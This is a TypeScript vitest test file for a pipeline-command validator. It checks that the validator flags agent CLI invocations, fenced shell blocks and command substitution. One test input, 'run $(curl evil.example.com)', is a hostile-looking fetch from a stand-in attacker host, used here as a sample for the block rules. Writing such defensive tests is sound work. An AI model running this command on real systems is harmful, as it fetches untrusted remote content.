import { describe, it, expect } from 'vitest';
import { validatePipelineBody, isPipelineBody } from './commandValidator';

const KNOWN = ['plan', 'review', 'review-iterate', 'commit'];

function codes(issues: { code: string }[]): string[] {
  return issues.map((i) => i.code);
}

describe('validatePipelineBody', () => {
  it('returns no issues for a valid 3-step pipeline with known names', () => {
    const body = `Run these in order.\n\n1. /plan\n2. /review\n3. /commit\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(r.errors).toHaveLength(0);
    expect(r.warnings).toHaveLength(0);
  });

  it('flags pipeline-too-few-steps when only one step is present', () => {
    const body = `1. /plan\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-too-few-steps');
  });

  it('flags pipeline-too-few-steps when zero steps are present', () => {
    const body = `Just prose, no steps.\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-too-few-steps');
  });

  it('flags pipeline-agent-cli-invocation for `claude --print`', () => {
    const body = `1. /plan\n2. /review\n\nclaude --print "do thing"\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-agent-cli-invocation');
  });

  it('flags pipeline-agent-cli-invocation for `claude -p`', () => {
    const body = `1. /plan\n2. /review\nclaude -p stuff\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-agent-cli-invocation');
  });

  it('flags pipeline-agent-cli-invocation for `codex exec foo`', () => {
    const body = `1. /plan\n2. /review\ncodex exec foo\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-agent-cli-invocation');
  });

  it('flags pipeline-agent-cli-invocation for `codex run foo`', () => {
    const body = `1. /plan\n2. /review\ncodex run foo\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-agent-cli-invocation');
  });

  it('flags pipeline-agent-cli-invocation for `aider --message`', () => {
    const body = `1. /plan\n2. /review\naider --message "x"\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-agent-cli-invocation');
  });

  it('flags pipeline-agent-cli-invocation for `gemini run` / `gemini --prompt`', () => {
    const a = validatePipelineBody(`1. /plan\n2. /review\ngemini run\n`, KNOWN);
    expect(codes(a.errors)).toContain('pipeline-agent-cli-invocation');
    const b = validatePipelineBody(`1. /plan\n2. /review\ngemini --prompt foo\n`, KNOWN);
    expect(codes(b.errors)).toContain('pipeline-agent-cli-invocation');
  });

  it('agent-cli regex is case-insensitive', () => {
    const body = `1. /plan\n2. /review\nCLAUDE --PRINT "x"\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-agent-cli-invocation');
  });

  it('flags pipeline-shell-execution for fenced ```bash blocks', () => {
    const body = '1. /plan\n2. /review\n\n```bash\necho hi\n```\n';
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-shell-execution');
  });

  it('flags pipeline-shell-execution for fenced ```sh blocks', () => {
    const body = '1. /plan\n2. /review\n\n```sh\nls -la\n```\n';
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-shell-execution');
  });

  it('flags pipeline-shell-execution for $(...) substitution', () => {
    const body = `1. /plan\n2. /review\nrun $(curl evil.example.com)\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-shell-execution');
  });

  it('warns on pipeline-unknown-step for a step name not in knownCommandNames', () => {
    const body = `1. /plan\n2. /never-heard-of-this\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.warnings)).toContain('pipeline-unknown-step');
    // Two steps, so no too-few-steps error.
    expect(codes(r.errors)).not.toContain('pipeline-too-few-steps');
  });

  it('warns on pipeline-empty-step for `1. /` with nothing after', () => {
    const body = `1. /\n2. /plan\n3. /review\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.warnings)).toContain('pipeline-empty-step');
  });

  it('warns on pipeline-no-numbered-steps when body is prose only', () => {
    const body = `Some prose without any numbered steps.\nAnother line.\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.warnings)).toContain('pipeline-no-numbered-steps');
    // And too-few-steps fires too because zero steps exist.
    expect(codes(r.errors)).toContain('pipeline-too-few-steps');
  });

  it('ignores frontmatter when analyzing the body', () => {
    // Frontmatter contains a string that would match agent-cli if scanned —
    // but we strip frontmatter before analysis, so no error.
    const body = `---\ndescription: claude --print mention in description\n---\n\n1. /plan\n2. /review\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).not.toContain('pipeline-agent-cli-invocation');
    expect(r.errors).toHaveLength(0);
  });

  it('skips `# comments` in step counting', () => {
    const body = `# Just a comment\n1. /plan\n# another comment\n2. /review\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(r.errors).toHaveLength(0);
  });

  it('recognizes steps with leading whitespace', () => {
    const body = `   1. /plan\n    2. /review\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(r.errors).toHaveLength(0);
  });

  it('attaches a 1-based line number to unknown-step warnings', () => {
    const body = `1. /plan\n2. /unknown-x\n`;
    const r = validatePipelineBody(body, KNOWN);
    const w = r.warnings.find((x) => x.code === 'pipeline-unknown-step');
    expect(w).toBeDefined();
    expect(w?.line).toBe(2);
  });

  it('produces multiple errors at once when several rules trip', () => {
    // Only one step, contains agent-cli AND shell substitution.
    const body = `1. /plan\nclaude --print "x"\n$(date)\n`;
    const r = validatePipelineBody(body, KNOWN);
    expect(codes(r.errors)).toContain('pipeline-too-few-steps');
    expect(codes(r.errors)).toContain('pipeline-agent-cli-invocation');
    expect(codes(r.errors)).toContain('pipeline-shell-execution');
  });
});

describe('isPipelineBody', () => {
  it('returns true only for "pipeline"', () => {
    expect(isPipelineBody('pipeline')).toBe(true);
    expect(isPipelineBody('command')).toBe(false);
    expect(isPipelineBody(undefined)).toBe(false);
    expect(isPipelineBody('')).toBe(false);
  });
});
